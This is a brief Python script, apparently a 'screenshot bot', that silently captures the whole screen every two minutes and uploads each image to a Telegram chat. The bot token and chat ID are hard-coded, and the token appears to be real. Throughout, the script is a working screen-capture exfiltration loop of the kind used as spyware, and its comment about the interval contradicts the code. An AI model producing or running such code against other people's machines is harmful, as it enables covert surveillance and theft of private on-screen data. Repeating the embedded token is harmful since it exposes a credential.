import pyautogui
import schedule
import time
import requests
from datetime import datetime

# Replace with your own Telegram Bot token and chat ID
BOT_TOKEN = "7645865635:AAE5UJwH4-nAg6982_QcGhRjSGi831SAKZY"
CHAT_ID = "866217267"

def take_screenshot():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    pyautogui.screenshot(filename)
    print(f"[+] Screenshot saved: {filename}")
    return filename

def send_to_telegram(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID, "caption": f"🖥 Screenshot taken at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print(f"[✓] Screenshot sent to Telegram!")
        else:
            print(f"[!] Failed to send: {response.text}")

def job():
    screenshot = take_screenshot()
    send_to_telegram(screenshot)

# Schedule job every 5 minutes
schedule.every(2).minutes.do(job)

print("[*] Screenshot bot started. Press Ctrl+C to stop.")
job()  # Run once immediately

while True:
    schedule.run_pending()
    time.sleep(1)
